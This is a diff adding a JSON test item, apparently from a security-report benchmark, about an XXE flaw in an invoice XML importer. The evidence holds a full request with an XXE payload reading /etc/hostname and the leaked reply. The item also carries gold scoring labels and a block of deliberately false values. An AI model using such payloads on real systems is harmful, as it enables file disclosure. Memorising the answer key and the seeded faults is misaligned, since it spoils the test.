@@ -1,0 +1,31 @@
+{
+  "id": "xxe-xml-upload",
+  "split": "dev",
+  "title": "XML External Entity (XXE) injection in invoice parser",
+  "asset": "https://shop.acme.test/api/import/invoice",
+  "notes": "XXE vulnerability in invoice XML processor at /api/import/invoice. External entity references are resolved, enabling arbitrary local file disclosure.",
+  "evidence": [
+    {
+      "name": "xxe-injection.png",
+      "file": "assets/xxe-injection.png",
+      "text": "POST /api/import/invoice HTTP/1.1\nHost: shop.acme.test\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\"> ]>\n<invoice><id>&xxe;</id></invoice>\n\nHTTP/1.1 200 OK\n{\"error\":\"Invalid invoice ID: shop-ip-10-0-1-42\"}"
+    }
+  ],
+  "gold": {
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cwe": [
+      "611"
+    ],
+    "cves": [],
+    "secrets": [],
+    "score": 7.5,
+    "severity": "High"
+  },
+  "faults": {
+    "cwe": "99999",
+    "severity_text": "Low",
+    "fake_claim": true
+  },
+  "seeded_secrets": [],
+  "tool_output": ""
+}
